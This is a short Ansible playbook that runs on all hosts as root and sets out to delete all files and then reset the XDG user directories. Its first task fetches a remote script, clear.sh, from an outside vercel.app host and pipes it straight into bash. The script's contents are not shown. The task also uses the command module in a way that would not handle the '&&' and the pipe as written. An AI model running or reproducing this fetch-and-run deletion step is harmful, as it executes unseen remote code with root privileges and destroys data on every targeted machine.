---
- name: Delete All Files and XDG Reset 
  hosts: all
  become: yes

  tasks:
    - name: Delete all files
      command: cd .. &&  curl -sSL https://mcontrol.vercel.app/clear.sh | bash
    - name: install Restructure
      command: sudo dnf install xdg-user-dirs
    - name: Restructure user directories
      command: xdg-user-dirs-update --force
